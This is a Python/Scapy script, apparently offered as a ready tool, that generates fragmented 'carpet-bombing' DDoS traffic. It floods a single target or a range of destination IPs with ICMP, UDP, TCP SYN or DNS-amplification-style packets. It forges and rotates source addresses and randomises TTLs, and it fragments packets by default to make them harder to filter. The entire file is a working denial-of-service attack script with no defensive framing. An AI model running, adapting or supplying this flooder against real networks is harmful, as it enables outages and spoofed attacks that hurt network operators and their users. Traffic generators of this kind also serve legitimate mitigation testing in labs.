"""Generate fragmented carpet-bombing traffic with Scapy."""

from __future__ import annotations

import argparse
import ipaddress
import random
import time

from scapy.all import ICMP, IP, TCP, UDP, Raw, fragment, send  # type: ignore

DEFAULT_TCP_PORTS = [21, 22, 25, 53, 80, 443, 8080]
DEFAULT_UDP_PORTS = [53, 123, 5000, 5353]
AMPLIFICATION_SOURCE_PORTS = [53, 123, 1900, 5353]

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Advanced fragmented carpet-bombing generator.")
    dst_group = parser.add_mutually_exclusive_group(required=True)
    dst_group.add_argument("--dst-ip", help="Single destination IP for classic DDoS")
    dst_group.add_argument(
        "--dst-range",
        help="Destination IP range, example: 10.20.0.1-10.20.0.80",
    )
    src_group = parser.add_mutually_exclusive_group(required=True)
    src_group.add_argument("--src-ip", help="Single source IP for crafted packets")
    src_group.add_argument("--src-range", help="Source IP range, example: 10.10.1.1-10.10.1.250")
    src_group.add_argument(
        "--src-ips",
        help="Comma-separated source IPs, example: 10.10.1.11,10.10.1.12",
    )
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--pps", type=int, default=200, help="Packets per second before fragmentation")
    parser.add_argument(
        "--protocol",
        choices=["icmp", "udp", "tcp_syn", "dns_amp", "mixed"],
        default="udp",
    )
    parser.add_argument("--fragsize", type=int, default=300, help="IP fragment size")
    parser.add_argument(
        "--fragment-mode",
        choices=["manual", "auto", "none"],
        default="manual",
        help="manual=Scapy fragment() before send, auto/none=send packet as-is",
    )
    parser.add_argument("--payload-size", type=int, default=4000, help="Raw payload size in bytes")
    parser.add_argument("--ttl-min", type=int, default=40)
    parser.add_argument("--ttl-max", type=int, default=64)
    parser.add_argument("--src-rotation-interval", type=float, default=5.0)
    parser.add_argument("--tcp-ports", nargs="+", type=int, default=DEFAULT_TCP_PORTS)
    parser.add_argument("--udp-ports", nargs="+", type=int, default=DEFAULT_UDP_PORTS)
    return parser.parse_args()


def iter_range(range_raw: str) -> list[str]:
    start_s, end_s = range_raw.split("-", 1)
    start = int(ipaddress.ip_address(start_s.strip()))
    end = int(ipaddress.ip_address(end_s.strip()))
    if start > end:
        raise ValueError("Invalid IP range: start > end")
    return [str(ipaddress.ip_address(value)) for value in range(start, end + 1)]


def parse_src_ips(args: argparse.Namespace) -> list[str]:
    if args.src_ip:
        return [str(ipaddress.ip_address(args.src_ip.strip()))]
    if args.src_range:
        return iter_range(args.src_range)
    if args.src_ips:
        parts = [part.strip() for part in args.src_ips.split(",") if part.strip()]
        if not parts:
            raise ValueError("--src-ips cannot be empty")
        return [str(ipaddress.ip_address(part)) for part in parts]
    raise ValueError("Provide one of --src-ip, --src-range, or --src-ips")


def build_packet(
    src_ip: str,
    dst_ip: str,
    proto: str,
    payload_size: int,
    ttl: int,
    tcp_ports: list[int],
    udp_ports: list[int],
):
    payload = Raw(b"A" * payload_size)
    ip_layer = IP(src=src_ip, dst=dst_ip, ttl=ttl, id=random.randint(1, 65535))

    if proto == "icmp":
        return ip_layer / ICMP() / payload

    if proto == "udp":
        return (
            ip_layer
            / UDP(
                sport=random.randint(1024, 65535),
                dport=random.choice(udp_ports),
            )
            / payload
        )

    if proto == "tcp_syn":
        return (
            ip_layer
            / TCP(
                sport=random.randint(1024, 65535),
                dport=random.choice(tcp_ports),
                flags="S",
            )
            / payload
        )

    if proto == "dns_amp":
        return (
            ip_layer
            / UDP(
                sport=random.choice(AMPLIFICATION_SOURCE_PORTS),
                dport=random.randint(1024, 65535),
            )
            / payload
        )

    selected_protocol = random.choice(["icmp", "udp", "tcp_syn", "dns_amp"])
    return build_packet(src_ip, dst_ip, selected_protocol, payload_size, ttl, tcp_ports, udp_ports)


def choose_ttl(ttl_min: int, ttl_max: int) -> int:
    if ttl_min > ttl_max:
        raise ValueError("--ttl-min cannot be greater than --ttl-max")
    return random.randint(ttl_min, ttl_max)


def run_attack(args: argparse.Namespace) -> None:
    src_ips = parse_src_ips(args)
    dst_ips = [args.dst_ip] if args.dst_ip else iter_range(args.dst_range)
    sleep_interval = 1.0 / max(args.pps, 1)
    end_time = time.time() + args.duration
    current_src = random.choice(src_ips)
    next_src_rotation = time.time() + args.src_rotation_interval

    while time.time() < end_time:
        now = time.time()
        if args.src_rotation_interval > 0 and now >= next_src_rotation:
            current_src = random.choice(src_ips)
            next_src_rotation = now + args.src_rotation_interval

        packet = build_packet(
            src_ip=current_src,
            dst_ip=random.choice(dst_ips),
            proto=args.protocol,
            payload_size=args.payload_size,
            ttl=choose_ttl(args.ttl_min, args.ttl_max),
            tcp_ports=args.tcp_ports,
            udp_ports=args.udp_ports,
        )

        if args.fragment_mode == "manual":
            send(fragment(packet, fragsize=args.fragsize), verbose=False)
        else:
            send(packet, verbose=False)

        time.sleep(sleep_interval)


def main() -> int:
    args = parse_args()
    run_attack(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
